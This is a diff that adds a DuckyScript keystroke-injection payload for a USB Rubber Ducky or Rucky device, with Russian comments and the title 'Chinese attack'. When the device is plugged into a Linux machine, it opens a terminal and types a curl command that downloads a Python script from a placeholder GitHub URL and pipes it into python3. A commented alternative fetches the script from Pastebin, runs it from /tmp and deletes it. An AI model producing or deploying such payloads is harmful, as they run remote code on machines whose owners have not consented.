@@ -1,0 +1,23 @@
+REM ================================================
+REM Китайская атака - Linux HID Payload
+REM Для USB Rubber Ducky / Rucky
+REM ================================================
+REM Открывает терминал и загружает скрипт с GitHub/Pastebin
+REM ================================================
+
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+
+REM Загружаем и запускаем скрипт с GitHub
+STRING curl -s https://raw.githubusercontent.com/YOUR_USERNAME/hamster_prank/main/payloads/chinese_attack_linux.py | python3
+ENTER
+
+REM Альтернатива - загрузка с Pastebin
+REM STRING curl -s https://pastebin.com/raw/YOUR_PASTE_ID -o /tmp/attack.py && python3 /tmp/attack.py && rm /tmp/attack.py
+REM ENTER
+
+REM Закрываем терминал (опционально)
+REM DELAY 500
+REM STRING exit
+REM ENTER
